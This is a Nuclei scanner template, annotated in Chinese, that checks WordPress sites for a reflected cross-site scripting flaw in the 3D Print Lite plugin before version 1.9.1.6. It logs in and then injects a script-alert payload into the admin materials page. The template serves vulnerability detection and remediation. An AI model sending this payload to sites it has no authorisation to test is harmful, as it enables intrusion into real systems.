id: 3d-print-lite-xss

info:
  name: 3D Print Lite < 1.9.1.6 - Reflected - 跨站脚本漏洞
  author: r3Y3r53
  severity: medium
  description: 3D Print Lite < 1.9.1.6 - 反射型跨站脚本 存在跨站脚本漏洞。该模板通过构造恶意输入并检查响应回显或执行特征，验证目标是否会在浏览器上下文中执行注入脚本。
  remediation: |
    - 按厂商公告升级到已修复版本；原始说明中提到的版本信息为：version 1.9.1.6 or latest。
    - 对所有可控输入实施严格校验，并在输出到 HTML、JavaScript 或 URL 上下文前完成正确编码。
    - 如为后台或插件组件问题，建议同步更新到厂商已修复版本并审计相关功能入口。
  reference:
    - https://wpscan.com/vulnerability/5909e225-5756-472e-a2fc-3ac52c7fb909
    - https://www.acunetix.com/vulnerabilities/web/wordpress-plugin-3dprint-lite-cross-site-scripting-1-9-1-5/
  classification:
    cwe-id: CWE-80
  metadata:
    verified: true
    max-request: 2
  tags: 3dprint,lite,authenticated,wpscan,xss,wordpress,wp-plugin,wp,vuln

http:
  - raw:
      - |
        POST /wp-login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        log={{username}}&pwd={{password}}&wp-submit=Log+In
      - |
        GET /wp-admin/admin.php?page=p3dlite_materials&material_text="><script>alert(document.domain)</script> HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'status_code_2 == 200'
          - 'contains(content_type_2, "text/html")'
          - 'contains(body_2, "<script>alert(document.domain)</script>")'
          - 'contains(body_2, "3dprint-lite_page_p3dlite_materials")'
        condition: and
